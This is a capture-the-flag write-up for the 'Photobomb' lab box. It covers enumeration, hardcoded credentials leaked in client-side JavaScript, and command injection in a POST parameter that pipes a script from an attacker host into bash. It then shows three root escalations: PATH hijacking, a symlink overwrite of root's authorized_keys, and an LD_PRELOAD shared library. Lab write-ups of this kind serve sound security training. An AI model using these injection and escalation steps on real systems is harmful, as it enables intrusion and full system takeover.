![photobomb.png](photobomb.png)

# Photobomb

## Enum
```bash
nmap -sV -sC 10.129.221.117 -oN scans/nmap.initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 18:31 IST
Nmap scan report for 10.129.221.117
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.54 seconds
```
```bash
sudo nmap -sU 10.129.221.117 -oN scans/nmap.udp
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 19:04 IST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 2.80% done; ETC: 19:12 (0:07:31 remaining)
Nmap scan report for photobomb.htb (10.129.221.117)
Host is up (0.035s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```
```bash
dirsearch -u http://photobomb.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/photobomb.htb/_22-10-09_18-32-23.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-09_18-32-23.log

Target: http://photobomb.htb/

[18:32:23] Starting:
[18:34:14] 200 -   11KB - /favicon.ico
[18:34:34] 401 -  590B  - /printer
```

## Hardcoded credentials in client side javascript

in the html header of the homepage there's a reference to photobomb.js
```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
the credentials are hardcoded in there:  
[http://pH0t0:b0Mb!@photobomb.htb/printer](http://pH0t0:b0Mb!@photobomb.htb/printer)
```
pH0t0:b0Mb!
```

## Footlhold through command injection in a POST parameter

There's a possible command injection in the filetype parameter in the POST request when downloading an image
```bash
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;curl%20http://10.10.15.78:8000/shell.sh|bash&dimensions=3000x2000cat ph
```

## Exploring potential privilege escalation vectors

once in the box wizard has sudo to a cleanup script with SETENV enabled, which means that we can bring environement variables over as we sudo 
```bash
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

the cleanup script does a bunch of things that we can leverage:  
  

## Privesc 1 - Path Hijacking

first one is, find is not an absolute path so we can do some path highjacking, note that the cleanup scrip loads its own .bashrc, in which the path is specified, but because we of SETENV this still works.
```bash
$ cat << EOF > find
> #!/usr/bin/bash
> cp /usr/bin/bash /tmp/cash
> chmod 4777 /tmp/cash
> EOF
$ cat find
#!/usr/bin/bash
cp /usr/bin/bash /tmp/cash
chmod 4777 /tmp/cash
$ pwd
/home/wizard
$ chmod 777 find
$ sudo PATH=/home/wizard/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /opt/cleanup.sh
$ ls -l /tmp/cash
-rwsrwxrwx 1 root root 1183448 Oct  9 21:54 /tmp/cash
$ /tmp/cash -p
wc -c /root/root.txt
33 /root/root.txt
```

## Privesc 2 - Symlink attack

another way is, because the cleanup.sh does some kind of manual logrotate thing, where it copies .log to .log.old, we can delete both, symlink log.old to whatever thing we wanna overwrite as root, and put the content of what we wanna write in .log
```bash
$ rm photobomb.*
$ ls -la
total 8
drwxrwxr-x 2 wizard wizard 4096 Oct  9 21:59 .
drwxrwxr-x 6 wizard wizard 4096 Oct  9 21:59 ..
$ ln -s /root/.ssh/authorized_keys photobomb.log.old
$ cat << EOF > photobomb.log
> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1aV0794+n5PgwXby/FDlO8tD0I0feVtY2zL3/TLjTKP/HfHZcmrYziPvnTixKaCp86me/S8CkBz4iHYe0sx4RMX8PC2Qf/UFg5vBWkZM4NeoGmnd5ctFFWGX9N6FyJJIFvL6Ya/Y+DYJTmQSi6zCw9coNX4zFkXRo4iryNPkTCOm77rq4O4mu+zH1XZOcwDBm+75/K846QJHYlFHSaFh9Ncg4P5YXzFPEzdz0/sDCuxa4Y0f1oMrtMya0VaEogF63IjriUrgwPo7vZgpA3exkF0V6xYHOCYrqzzZskiPvt/7T/RaDXJA6zTxgg168TWBMYhpKeX4pNgAR/URD2fpISIpN/EgHu5pSTk2GyokSikwHffyo14Wieco9Y+qi7fguP68ngbQP7jmZXxaCBd7PQaHkHR5CN01XdGIDABvDpQppfF9jtUafY46wfzy2OhmsPaNWGTiIf07rA5mB9Yes2D+2//OoQIzSgRBXHl9H99HZ+Seb9nQGnbRekxF2msk=
> EOF
$ sudo /opt/cleanup
```

## Privesc 3 - Dynamic Linker Hijacking

and yet another way is to use `LD_PRELOAD` to load a so lib that will be loaded by find
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/usr/bin/bash");
}
```
compile as a shared library (from an amd64 system)
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 |         setgid(0);
      |         ^~~~~~
shell.c:7:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |         setuid(0);
      |         ^~~~~~
```
get that over to the target in /tmp/shell.so
and run the cleanup passing `LD_PRELOAD`
```bash
$ cd /tmp
$ curl http://10.10.15.78:8000/shell.so -O
$ sudo LD_PRELOAD=/tmp/shell.so /opt/cleanup
```
